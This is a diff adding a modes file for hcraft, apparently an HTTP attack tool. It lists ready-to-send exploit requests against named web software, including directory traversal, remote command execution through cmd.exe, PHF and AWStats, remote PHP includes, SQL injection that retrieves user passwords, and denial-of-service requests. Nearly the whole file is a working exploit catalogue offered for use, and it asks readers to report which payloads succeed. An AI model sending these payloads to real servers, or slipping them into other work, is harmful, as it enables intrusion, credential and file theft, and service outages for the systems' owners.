@@ -1,0 +1,172 @@
+# hcraft modes file - Each entry in this file (one per line) describes a mode of operation,
+# specifically targeted at an individual vulnerability.  When hcraft is run with a mode
+# ID or a range of mode ID's, the related HTTP request will be built and sent to the target
+# HTTP server.  A mode is described as individual components seperated either by tab or
+# space characers:
+#
+#   <ID><tabs>"Description String"<tabs><HTTP-METHOD><tabs><requestpart1> <requestpart2> ...
+#
+# ID may be any positive, numeric value.
+#
+# "Description String" is a quoted, string literal used to describe the vulnerability,
+# platform, or other information used by the user when listing/grepping the available
+# modes (see hcraft's -l option).
+#
+# <HTTP-METHOD> may be any HTTP method supported by the target server such as GET, HEAD,
+# SEARCH, LOCK, etc.  NOTE that the method is NOT quoted.
+#
+# requestparts may be any non-quoted text string as sent to an http server, delimited
+# by spaces (quotes will be treated as literal parts of a requestpart).  requestparts are
+# just that, parts of a HTTP request.  As such, they will be concatenated together prior to 
+# being sent to a HTTP server.  If you require spaces in the request, you must use
+# the hex representation of a space (see below).  requestparts may also be any of the following
+# interpreted variables as denoted by the double parentheses (%%) on both the beginning
+# and end of the variable name:
+#
+#   %%ARGV%%     The complete additional argument string to the commandline.
+#   %%ARGV#%%    Individual additional arguments to the commandline (replace # with a
+#                positive numerical value).
+#   %%ARGV#:#%%  A range of arguments from the additional argument string starting at the
+#                numerical value before the ':' and ending at the numerical value after
+#                the ':'.  Omitting the ending numerical value will use all remaining
+#                arguments.
+#   %%REP#%%     Repeat the last requestpart # times (replace # with a positive numerical
+#                value).
+#
+# NOTE, the %%ARGV%% and %%ARGV#:#%% variables are special in that they INCLUDE spaces between
+# the individual additional arguments in the resultant request that is sent to the server.
+# Hence, the additional arguments arg1, arg2 and arg3 would be interpreted as "arg1 arg2 arg3".
+# These variables are primarily used to pass complete commandlines to a mode.  The numbered
+# %%ARGV#%% variables are treated as individual requestparts and as such will be concatenated
+# together with other requestparts.
+#
+# Also listed here are the hex representations of characters you may need to include in
+# various requestparts:
+#
+#   %20  Space Character
+#   %0a  Newline (\n)
+#   %0d  Carrage Return (\r)
+#
+# If further special characters or extended ascii are required, please consult an ascii
+# chart such as http://www.asciitable.com
+
+# Tested File Retrieval Modes
+
+1	"Generic Directory Traversal"						GET	/.. %%REP10%% %%ARGV1%%
+2	"PHF - File Disclosure via Command Execution (cat)"			GET	/cgi-bin/phf?Qalias=x%0a/bin/cat%20 %%ARGV1%% 
+3	"Anaconda Foundataion - apexec.pl File Disclosure"			GET	/cgi-bin/apexec.pl?template= %%ARGV1%% %%0000.html
+
+# Tested Command Execution Modes
+
+2000	"Classic PHF Command Execution"						GET	/cgi-bin/phf?Qalias=x%0a %%ARGV%% 
+2001	"Microsoft IIS - Extended Unicode Command Execution (scripts)"		GET	/scripts /..%c1%9c.. %%REP3%% /winnt/system32/cmd.exe?/c+ %%ARGV%%
+# 2002 requires argv[1] to be a known executable.  Remaining arguments consist of the desired commandline
+2002	"Microsoft IIS - Executable Parsing Command Execution"			GET	/scripts/%%ARGV1%% "+&+ %%ARGV2:%% +c:/+.exe
+2003	"Microsoft IIS - Executable Parsing Command Execution (Q277873)"	GET	/scripts/%%ARGV1%%/..%C1%9C..%C1%9C..%C1%9Cwinnt/system32/cmd.exe?/c%20 %%ARGV2:%%
+2004	"AWStats 5.0-6.2 - Remote Command Execution (CAN-2005-0116/BID12298)"	GET	/cgi-bin/awstats.pl?configdir=|echo%20; %%ARGV%% ;echo%20
+
+# Tested Misc.
+
+4000	"Microsoft IIS - IP Address Disclosure"					GET	%%ARGV1%%
+
+# Untested File Retrieval Modes
+# If you use any of these and they work (or you modify them to work), please send a note to
+# druid at caughq.org or intropy at caughq.org for graduation into the Tested Modes group.
+
+5000	"IBM Tivoli Directory Server - Directory Traversal"			GET	/ldap/cgi-bin/ldacgi.exe?Action=Substitute&Template=../../../../../ %%ARGV1%% &Sub=LocalePath&LocalePath=enus1252
+5001	"MyDMS - Directory Traversal"						GET	/mydms/op/op.ViewOnline.php?request=4:6: /.. %%REP4%% %%ARGV1%%
+5002	"iPlanet CMS - Directory Traversal"					GET	/ca/\ ../\ %%REP2%% %%ARGV1%%
+5003	"Microsoft IIS - Alternate Data Stream File Disclosure"			GET	%%ARGV1%% ::$DATA
+5004	"Microsoft IIS - showcode ASP Disclosure"				GET	/msadc/Samples/SELECTOR/showcode.asp?source=/msadc/Samples/../../../../../ %%ARGV1%%
+5005	"Microsoft SiteServer - AdSamples Disclosure"				GET	/adsamples/config/site.csc
+5006	"Microsoft IIS - IDC Path Disclosure"					GET	/ %%ARGV1%% .idc
+5007	"Microsoft IIS - Byte Code Source Disclosure"				GET	/ %%ARGV1%% %fd
+5008	"Microsoft IIS - idq.dll Directory Traversal"				GET	/query.idq?CiTemplate=../../.. %%ARGV1%%
+5009	"Microsoft FrontPage - PWS Directory Traversal"				GET	/.... %%REP3%% %%ARGV1%%
+5010	"Microsoft IIS - UNC Source Disclosure"					GET	/ %%ARGV1%% .asp\\
+5011	"Microsoft Index Server - ASP Source Disclosure"			GET	/null.htw?CiWebHitsFile=/ %%ARGV1%% %20&CiRestriction=none&CiHiliteType=Full
+5012	"Microsoft FrontPage - File Existence Disclosure"			GET	/cgi-bin/htimage.exe/ %%ARGV1%% ?0,0
+5013	"Microsoft IIS - Malformed Filename Request"				GET	/ %%ARGV1%% %30 %%REP230%% .htr
+5014	"Microsoft IIS - Extended Unicode Directory Traversal (msadc)"		GET	/msadc/..%c0%af../..%c0%af../..%c0%af.. %%ARGV1%%
+5015	"Microsoft IIS - Extended Unicode Directory Traversal (scripts)"	GET	/scripts/..%c1%9c../..%c1%9c../..%c1%9c../..%c1%9c.. %%ARGV1%%
+5016	"Microsoft IIS - Appended Dot Source Disclosure"			GET	/ %%ARGV1%% .
+5017	"Microsoft IIS - Bbdir.htr File Disclosure"				GET	/scripts/iisadmin/bdir.htr?? %%ARGV1%%
+5018	"Microsoft IIS - CodeBrws.asp Source Code Disclosure"			GET	/iissamples/sdk/asp/docs/CodeBrws.asp?Source=/IISSAMPLES/%c0%ae%c0%ae/ %%ARGV1%%
+5019	"EZshopper - loadpage.cgi Directory Traversal"				GET	/cgi-bin/loadpage.cgi?user_id=id&file=.|./.|./.|./.|./.|. %%ARGV1%% %00.html
+5020	"PnTresMailer - Directory Traversal"					GET	/codebrowserpntm.php?downloadfolder=pnTresMailer&filetodownload=../../../.. %%ARGV1%%
+5021	"Brio - odscgi Directory Traversal"					GET	/ods-cgi/odscgi?HTMLFile=../../../../../.. %%ARGV1%%
+5022	"BlogTorrent preview 0.8 - btdownload.php Directory Traversal"		GET	/battletorrent/btdownload.php?type=torrent&file=../../../../.. %%ARGV1%%
+5023	"JAF CMS - index.php Directory Traversal"				GET	/jaf/index.php?show=../../../../../../.. %%ARGV1%%
+5024	"QwikiWiki - index.php Directory Traversal"				GET	/qwiki/index.php?page=../../../../../.. %%ARGV1%% %00
+5025	"Simple PHP Blog - Text Retrieval Directory Traversal (supply filename sans '.txt')"	GET	/sphpblog/comments.php?y=05&m=01&entry=../../../../../../.. %%ARGV1%%
+5026	"Emotion MediaPartner Web Server Version 5 - Directory Traversal"	GET	/../../../../../.. %%ARGV1%%
+5027	"ZeroBoard <4.1pl5 - _head.php Directory Traversal"			GET	/_head.php?_zb_path=../../../../.. %%ARGV1%% %00
+5028	"ZeroBoard <4.1pl5 - write.php Directory Traversal"			GET	/include/write.php?dir=../../../../.. %%ARGV1%% %00
+5029	"ZeroBoard <4.1pl5 - outlogin.php Directory Traversal"			GET	/outlogin.php?_zb_path=../../../../.. %%ARGV1%% %00
+5030	"Minis <0.2.1 - minis.php 'month' Parameter Directory Traversal"	GET	/minis/minis.php?month=../../../../../../../.. %%ARGV1%%
+5031	"JSBoard <= 2.0.9 - Directory Traversal"				GET	/session.php?logins=true&m=logout&table=../../../../../.. %%ARGV1%% %00
+5032	"RaidenHTTPD - File Retrieval (provide full path sans initial "/")	GET	%%ARGV1%%
+5033	"CubeCart 2.0.4 - Directory Traversal"					GET	/index.php?&language=../../../../../../../.. %%ARGV1%%
+5034	"SD Server <= 4.0.70 - Directory Traversal"				GET	/.. %%REP8%% %%ARGV1%%
+5035	"CIS WebServer <= 3.5.13 - Directory Traversal"				GET	/.. %%REP8%% %%ARGV1%%
+5036	"Computalynx CProxy 3.3.0 - 3.4.4 - POST Directory Traversal"		POST	/.. %%REP5%% %%ARGV1%% %20HTTP/1.0
+5037	"Computalynx CProxy 3.3.0 - 3.4.4 - HEAD Directory Traversal"		HEAD	/.. %%REP5%% %%ARGV1%% %20HTTP/1.0
+5038	"The Includer - includer.cgi Directory Traversal"			GET	/includer.cgi? ../ %%REP11%% %%ARGV1%%
+5039	"RUNCMS - highlight.php File Retrieval"					GET	/runcms/class/debug/highlight.php?file= %%ARGV1%% &line=151#151
+5040	"osCommerce - file_manager.php Download Action Directory Traversal"	GET	/admin/file_manager.php?action=download&filename=.. /.. %%REP5%% %%ARGV1%%
+5041	"osCommerce - file_manager.php Read Action Directory Traversal"		GET	/admin/file_manager.php?action=read&filename=.. /.. %%REP5%% %%ARGV1%%
+5042	"phpCoin <= 1.2.1b - auxpage.php Directory Traversal"			GET	/auxpage.php?page= ../ %%REP2 %%ARGV1%%
+5043	"FastStone 4in1 Browser <= 1.2 - Directory Traversal (1)"		GET	/... %%REP5%% %%ARGV1%%
+5044	"FastStone 4in1 Browser <= 1.2 - Directory Traversal (2)"		GET	/ ..\ %%REP7%% %%ARGV1%%
+5045	"Logics Software BS2000 - File Retrieval (Windows)"			GET	/logwebcgi/logwebftbs2000.exe?VAR_FT_LANG=c:\&VAR_FT_TMPL= %%ARGV1%%
+5046	"Logics Software BS2000 - File Retrieval (UNIX)"			GET	/logwebcgi/logwebftbs2000.exe?VAR_FT_LANG=/&VAR_FT_TMPL= %%ARGV1%%
+5047	"CubeCart 2.0.6 - Directory Traversal"					GET	/index.php?language=.. /.. %%REP4%% %%ARGV1%%
+
+
+# Untested Command Execution Modes
+# If you use any of these and they work (or you modify them to work), please send a note to
+# druid at caughq.org or intropy at caughq.org for graduation into the Tested Modes group.
+
+6000	"Microsoft JET DE - Arbitraty Command Execution"			GET	/AdvWorks/equipment/catalog_type.asp?ProductType=|shell(" %%ARGV%% ")|
+6001	"Microsoft IIS - Extended Unicode Command Execution (msadc)"		GET	/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+ %%ARGV%%
+6002	"Microsoft IIS - Executable Parsing Command Execution (mssql7)"		GET	/scripts/..%c1%1c../..%c1%1c../mssql7/install/pubtext.bat"+&+dir+c:\\+.exe
+6003	"vbulletin 3.0 - 3.0.4 - forumdisplay.php Code Execution"		GET	/forumdisplay.php?GLOBALS[]=1&f=2&comma=".system(' %%ARGV%% ')."
+6004	"The Includer - includer.cgi Command Execution"				GET	/includer.cgi?| %%ARGV%% |
+6005	"The Includer - includer.cgi template Command Execution"		GET	/includer.cgi?template=| %%ARGV%% |
+6006	"Double Choco Latte <= 0.9.4 - Command Execution"			GET	/main.php?menuAction=htmlTickets.show;system( %%ARGV%% );ob_start
+
+
+# Untested Source Include Modes
+# If you use any of these and they work (or you modify them to work), please send a note to
+# druid at caughq.org or intropy at caughq.org for graduation into the Tested Modes group.
+7000	"ZeroBoard <4.1pl5 - print_category.php Remote PHP Source Include"	GET	/include/print_category.php?setup[use_category]=1&dir= %%ARGV1%% /
+7001	"ZeroBoard <4.1pl5 - zero_vote login.php Remote PHP Source Include"	GET	/skin/zero_vote/login.php?%20dir= %%ARGV1%% /
+7002	"ZeroBoard <4.1pl5 - zero_vote setup.php Remote PHP Source Include"	GET	/skin/zero_vote/setup.php?%20dir= %%ARGV1%% /
+7003	"ZeroBoard <4.1pl5 - zero_vote ask_password.php Remote PHP Source Include"	GET	/skin/zero_vote/ask_password.php?%20dir= %%ARGV1%% /
+7004	"ZeroBoard <4.1pl5 - zero_vote error.php Remote PHP Source Include"	GET	/skin/zero_vote/error.php?%20dir= %%ARGV1%% /
+7005	"mcNews <=1.3 - install.php Remote PHP Source Include"			GET	/admin/install.php?l= %%ARGV1%%
+7006	"Vortex Portal - index.php Remote PHP Source Include"			GET	/index.php?act= %%ARGV1%%
+7007	"Vortex Portal - content.php Remote PHP Source Include"			GET	/content.php?act= %%ARGV1%%
+
+
+# Untested Misc.
+# If you use any of these and they work (or you modify them to work), please send a note to
+# druid at caughq.org or intropy at caughq.org for graduation into the Tested Modes group.
+
+8000	"Microsoft FrontPage - Extensions Path Disclosure"			GET	/_vti_bin/shtml.exe/non-existent-file.html
+8001	"Microsoft IIS - Source Fragment Disclosure				GET	/global.asa+.htr
+8002	"Microsoft IIS - IP Address Disclosure"					HEAD	/ %%ARGV1%%
+8003	"Microsoft IIS - Indexed Directory Disclosure"				SEARCH	%%ARGV1%%
+8004	"Microsoft WebDav - LOCK Memory Leak DoS"				LOCK	/ a %%REP25%% .htw
+8005	"Microsoft Index Server - File and Path Disclosure"			GET	/iissamples/ISSamples/SQLQHit.asp?CiColumns=*&CiScope=webinfo
+8006	"KorWeblog <= 1.6.2 - Directory Traversal Directory Listing"		GET	/viewimg.php?path=images.d/face/ ../ %%REP6%% %%ARGV1%% &form=Com&var=faceicon
+8007	"GForge <= 3.3 - Directory Traversal Directory Listing (provide group # as argument)"	GET	/scm/controlleroo.php?group_id= %%ARGV1%% &dir_name= ../ %%REP7%% &hide_attic=0
+8008	"Mercuryboard <= 1.1.1 - SQL Injection Accounts Retrieval"		GET	/mercuryboard/index.php?a=post&s=reply&t=1&qu=10000%20UNION%20SELECT%20user_password,user_name%20from%20mb_users%20where%20user_group%20=%201%20limit%201/*
+8009	"Postnuke/PHPbb - SQL Injection"						GET	/index.php?name=PNphpBB2&file=privmsg&folder=savebox&mode=read&p=99&pm_sql_user=AND%20pm.privmsgs_type=-99%20 %%ARGV%%
+8010	"phpMyFamily <= 1.4.0 - SQL Injection"					GET	/people.php?person=00002' %%ARGV%% /*
+8011	"NukeBookmarks <= 0.6 - SQL Injection"					GET	/modules.php?name=bookmarks&file=marks&catname=1&category=-1/**/union/**/ %%ARGV%%
+8012	"Photopost PHP Pro - showmembers.php SQL Injection"			GET	/showmembers.php?si= %%ARGV%%
+8013	"DLMan Pro (PhpBB Mod) - SQL Injection"					GET	/dlman.php?func=file_info&file_id=' %%ARGV%%
+8014	"LinksLinks Pro (PhpBB Mod) - SQL Injection"				GET	/links.php?func=show&id=' %%ARGV%%
+8015	"Lotus Domino - Web Service Denial of Service"				GET	/cgi-bin/ ´ %%REP330%% HTTP/1.0%0aHost:%2010.10.0.100
+
